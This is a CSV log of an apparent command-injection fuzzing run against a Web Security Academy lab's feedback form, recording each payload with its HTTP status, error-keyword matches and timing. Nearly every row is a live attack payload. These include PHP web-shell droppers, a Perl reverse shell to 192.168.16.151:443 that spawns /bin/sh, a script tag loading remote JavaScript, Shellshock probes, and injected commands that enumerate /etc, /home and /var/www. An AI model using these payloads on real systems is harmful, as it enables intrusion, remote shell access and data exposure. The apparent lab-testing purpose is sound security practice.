id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,98,"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,99,"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,100,;echo '<script>alert(1)</script>',https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,101,echo '<script>alert(1)</script>'// XXXXXXXXXXX,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,102,echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,103,"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,104,"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,105,"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,106,"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,107,"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,108,() { :;}; echo vulnerable 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,109,eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,110,eval('ls'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,111,eval('pwd'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,112,eval('pwd');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,113,eval('sleep 5'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,114,eval('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,115,eval('whoami'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,116,eval('whoami');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,117,exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,118,exec('ls'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,119,exec('pwd'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,120,exec('pwd');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,121,exec('sleep 5'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,122,exec('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,123,exec('whoami'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,124,exec('whoami');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,125,";{$_GET[""cmd""]}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,126,`id`,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,127,|id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,128,| id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,129,;id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,130,;id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,131,;id;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,132,& id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,133,&&id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,134,";id
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,135,ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,136,| ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,137,; ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,138,& ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,139,&& ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,140,/index.html|id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,141,ipconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,142,| ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,143,; ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,144,& ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,145,&& ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,146,ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,147,ls,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,148,$(`ls`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,149,| ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,150,; ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,151,& ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,152,&& ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,153,ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,154,| ls -laR /etc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,155,; ls -laR /etc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,156,& ls -laR /etc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,157,&& ls -laR /etc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,158,| ls -laR /var/www,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,159,; ls -laR /var/www,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,160,& ls -laR /var/www,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,161,&& ls -laR /var/www,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,162,| ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,163,; ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,164,& ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,165,&& ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,166,ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,167,ls -lh /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,168,| ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,169,; ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,170,& ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,171,&& ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,172,ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,173,*; ls -lhtR /var/www/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,174,| ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,175,; ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,176,& ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,177,&& ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,178,ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,179,| ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,180,; ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
